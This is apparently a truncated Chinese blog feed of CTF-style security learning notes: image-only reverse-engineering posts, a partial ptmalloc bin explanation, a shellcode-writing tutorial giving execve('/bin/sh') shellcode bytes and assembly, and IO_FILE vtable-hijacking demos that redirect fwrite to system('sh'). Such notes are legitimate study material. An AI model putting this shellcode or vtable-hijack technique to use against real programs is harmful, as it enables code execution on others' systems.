src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/8.png" alt="8.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/9.png" alt="9.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/10.png" alt="10.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/11.png" alt="11.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/12.png" alt="12.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/13.png" alt="13.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/14.png" alt="14.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制软件逆向分析基础</title>
    <link href="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/1.png" alt="1.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/2.png" alt="2.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/3.png" alt="3.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/4.png" alt="4.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/5.png" alt="5.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/6.png" alt="6.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/7.png" alt="7.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/8.png" alt="8.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/9.png" alt="9.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/10.png" alt="10.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>分箱式内存管理</title>
    <link href="/2021/06/20/%E5%88%86%E7%AE%B1%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2021/06/20/%E5%88%86%E7%AE%B1%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>对于空闲的chunk，ptmalloc采用分箱式的内存管理方式，根据空闲chunk的大小和处于的状态将其放在四个不同的bin中，这四个空闲chunk的容器包括fastbins，unsorted bin，small bins和large bins。fast bins是小内存块的高速缓存，当一些大小小于64字节的chunk被回收时，首先会放入fast bins中，在分配小内存时，首先会查看fast bins中是否有合适的内存块，如果存在，则直接返回fast bins中的内存块，以加快分配速度。Unszhiyouorted bin‪只有一个，回收的chunk块必须先放到unsorted bin中，分配内存时会查看unsorted bin 中是否偶合适的chunk，如果找到满足条件的chunk，则直接返回给用户，否则将unsorted bin的所有chunk放入small bins或是large bins的所有chunk放入small bins或是large bins中。small bins用于存放固定大小的chunk，共64个bin，最小的chunk大小为16字节或32字节，每个bin的大小相差8字节或是16字节，当分配小内存块时，采用精确匹配的方式从small bin中查找合适的chunk。Large bins用于存储大于等于512或1024B的空闲chunk，这些chunk使用双向链表的形式按大小顺序排序，分配内存时按最近匹配方式从large bins中分配chunk。</p><h1 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h1><p>ptmalloc使用small bins管理空闲小chunk，每个small bin中的chunk的大小与bin的index有如下关系：<br>Chunk_size=2<em>SIZE_SZ</em>index<br>在SIZE_SZ为4B的平台上，small bins中的chunk大小是以8B为公差的等差数列，最大的chunk大小为504B，最小的chunk大小为16B，所以实际共62个bin。分别为16B、24B、32B，……，504B。在SIZE_SZ为8B的平台上，small bins中的chunk大小是以16B为公差的等差数列，最大的chunk大小为1008B，最小的chunk大小为32B，所以实际共62个bin。分别为32B、48B、64B，……，1008B。<br>ptmalloc维护了62个双向环形链表（每个链表都具有链表头节点，加头结点的最大作用就是便于对链表内节点的统一处理，即简化编程），每一个链表内的各空闲chunk的大小一直，因此当应用程序需要分配某个字节大小的内存空间时直接在对应的链表内取就可以了，这样既可以很好的满足应用程序的内存空间申请请求而又不会出现太多的内存碎片。我们可以用下图来表示在SIZE_SZ位4B的平台上ptmalloc对512B字节一下的空闲chunk组织方式（所谓分箱机制）。</p><h1 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h1><h1 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h1><h1 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PWN-Shellcode编写</title>
    <link href="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/"/>
    <url>/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。</p><h1 id="一、获取集成写好的"><a href="#一、获取集成写好的" class="headerlink" title="一、获取集成写好的"></a>一、获取集成写好的</h1><h3 id="1、From-pwntools"><a href="#1、From-pwntools" class="headerlink" title="1、From pwntools"></a>1、From pwntools</h3><p>（1）先设置目标机的参数<br>context（os=”linux”，arch=”amd64”,log_level=’debug’）<br>log_level设置日志输出的等级debug，这样pwntools会将整个完整的io过程都打印下来，使得调试更加方便，可以避免在完成在完成CTF题目时出现一些和IO相关的错误。<br>（2）获取shellcode</p><p>1）获得执行system(“/bin/sh”)汇编代码所对应的机器码<br>asm(shellcraft.sh()）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>，arch=<span class="string">&#x27;i386&#x27;</span>，os=<span class="string">&#x27;linux&#x27;</span>）</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>2.利用别人写好的。如exploit-db<br>利用搜索引擎检索别人写好的可以直接来用的 shellcode。<br>sh对应的shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;</span></span><br></pre></td></tr></table></figure><h1 id="二、自己写"><a href="#二、自己写" class="headerlink" title="二、自己写"></a>二、自己写</h1><p>或者可以用msf生成，或者自己反编译一下。<br><img src="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/1.png" alt="1.png"><br>这里我们使用一段最简单的执行execve(“/bin/sh”)命令的语句作为shellcode。</p><p>以写一个execve(“/bin/sh”)为例子。<br>在当前位置执行“/bin/sh”，可以用execve(“/bin/sh”,0,0)<br>C语言利用代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line">char *buf[]=&#123;<span class="string">&quot;/bin/sh&quot;</span>,NULL&#125;;</span><br><span class="line">void <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">     execve(<span class="string">&quot;/bin/sh&quot;</span>,buf,NULL);</span><br><span class="line">     <span class="built_in">exit</span>(0);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>execve()用来执行参数filename字符串所代表的文件路径，第二个参数利用指针数组来传递执行文件的参数，并且需要以空指针（NULL）结束，最后一个参数则为传递给执行文件的新环境变量数组。<br>execve()对应的中断向量表为：0x0b，对应eax</p><p>所以我们要做的就是写一个执行execve的汇编代码。</p><p>这里不得不提一下Int 0x80软中断调用。<br>第一步，就是需要将系统调用号加入到eax中。<br>第二步，ebx保存函数调用的第一个参数，ecx、edx、esi、edi分别对应这2345个参数。</p><p>如果参数超过5个，就必须将参数数组存储到内存中，而且必须将该数组的地址放在ebx中。<br>一旦加载寄存器后，就会调用int 0x80汇编指令来中断，强迫内核暂停手头上的工作并处理该中断。</p><p>故汇编代码的最后一步为<br>mov al,0xb<br>int 0x80<br>具体代码如下：<br>构造一个execve(“/bin/sh”,0,NULL)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax,eax //eax置零</span><br><span class="line">xor edx,edx //edx置零</span><br><span class="line">push edx</span><br><span class="line">push <span class="string">&quot;/sh&quot;</span></span><br><span class="line">push <span class="string">&quot;/bin&quot;</span> // 将/bin/sh入栈</span><br><span class="line">mov ebx,esp // ebx指向/bin/sh这个字符串</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov al,0bh  //eax置为execve函数的中断号</span><br><span class="line">int 80h  //调用软中断</span><br></pre></td></tr></table></figure><p>运用nasm -f elf32 文件名.asm<br>ld -m elf_i386 -o 文件名 文件名.o<br>objdump -o 文件名<br>获得汇编的机器码，如下<br><img src="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/2.png" alt="2.png"><br>我们可以看到上图画线处有\00，shellcode在使用时遇到\00会被截断，所以我们要避免出现\x00字节，我们知道00是出现在/bin/sh那里的，重新修改我们的汇编程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax,eax</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push <span class="string">&quot;//sh&quot;</span></span><br><span class="line">push <span class="string">&quot;/bin&quot;</span></span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov al,0Bh</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure><p>在终端中”/bin/sh”和”/bin//sh”的效果是一样的。<br>执行后如下：<br><img src="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/3.png" alt="3.png"><br>所以shellcode就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IO_FILE学习</title>
    <link href="/2021/06/19/IO-FILE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/06/19/IO-FILE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h1><p>FILE在linux系统的标准IO库中是用于描述文件结构的，成为文件流。FILE结构在程序fopen等函数时会进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值。FILE结构定义在libc.h中，如下图所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值我们可以遍历所有结构。<br>在标准I/O库中，每个程序启动时会有三个文件流自动打开的：stdin、stdout、stderr。他们的结构指针分别是_IO_2_1_stderr。他们的结构指针分别是_IO_2_1_stderr_、IO_2_1_stdout、IO_2_1_stdin。<br>IO_2_1_stderr、IO_2_1_stdin_是_IO_FILE结构外包裹着另一种结构的_FILE_plus，其中包含了一个重要的指针vtable指向了一些列函数指针。<br>结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IO_jump_t保存的一系列指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos      </span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="伪造vtable劫持程序流程"><a href="#伪造vtable劫持程序流程" class="headerlink" title="伪造vtable劫持程序流程"></a>伪造vtable劫持程序流程</h1><p>Linux中一些常见的IO操作函数都需要经过FILE结构进行处理。尤其是_IO_FILE_plus结构中存在vtable，一些函数会取出vtable中的指针进行调用。因此伪造vgable劫持程序流程的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现。vtable劫持分为两种，一种是直接改写vtable中的函数指针，通过任意地址写就可以实现。另一种是覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针。</p><h1 id="具体用法"><a href="#具体用法" class="headerlink" title="具体用法"></a>具体用法</h1><p>修改vtable中的指针</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    long long *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable</span><br><span class="line"></span><br><span class="line">    vtable_ptr[7]=0x41414141 //xsputn</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call 0x41414141&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据vtable在_IO_FILE_plus中的偏移得到vtable的地址，之后需要搞清欲劫持的IO函数会劫持vtable中的哪个函数。<br>这里给出常用函数执行过程中的调用：<br>1、fread函数调用_IO_FILE_plus.vtable中的_IO_XSGETN指针<br>2、fwrite函数调用_IO_FILE_plus.vtable中的_IO_XSPUTN指针，IO_XSPUTN中会调用同样位于vtable中的_IO_FILE_plus.vtable中的_IO_OVERFLOW指针<br>3、fclose函数调用_IO_FILE_plus.vtable中的_IO_FILE_plus.vtable中的_IO_FINISH指针<br>4、printf/puts与fwrite函数调用大致相同，均会调用_IO_XSPUTN指针和_IO_OVERFLOW指针</p><p>这里Printf函数会调用vtable中的xsputn，并且xsputn是vtable中的第8项，之后就可以写入这个指针进行劫持。并且在xsputn等vtable函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus地址。比如这个例子调用printf，传递给vtable的第一个参数就是_IO_2_1_stdout_的地址。利用这点可以实现给劫持的vtable函数传参，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    memcopy(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过偏移计算得到xsputn的地址，，将xsputn指针指向system函数的地址，同时将_IO_FILE_plus头部内容改为sh,这样fwrite函数中调用xsputn时实际运行system(“sh”)。<br>但是在一般libc版本下，位于libc数据段的vtable是不可以进行写入的。不过，通过在可控的内存中伪造vtable的方法依然可以实现利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span 